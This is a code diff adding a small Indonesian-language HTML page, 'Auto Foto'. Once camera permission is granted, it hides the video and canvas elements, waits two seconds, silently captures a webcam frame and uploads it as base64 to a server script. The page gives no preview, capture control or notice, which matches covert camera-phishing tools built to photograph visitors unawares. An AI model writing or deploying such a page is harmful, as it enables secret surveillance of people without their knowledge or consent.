@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Foto</title>
+</head>
+<body>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" width="300" height="300" style="display:none;"></canvas>
+
+  <script>
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        // Tunggu 2 detik biar kamera nyala, lalu otomatis ambil foto
+        setTimeout(() => {
+          const canvas = document.getElementById("canvas");
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // Convert ke base64
+          const dataURL = canvas.toDataURL("image/png");
+
+          // Upload ke server
+          fetch("upload.php", {
+            method: "POST",
+            body: JSON.stringify({ image: dataURL }),
+            headers: { "Content-Type": "application/json" }
+          })
+          .then(res => res.text())
+          .then(data => alert(data))
+          .catch(err => alert("Error: " + err));
+        }, 2000); // otomatis jepret setelah 2 detik
+      })
+      .catch(err => alert("Kamera diblokir: " + err));
+  </script>
+</body>
+</html>
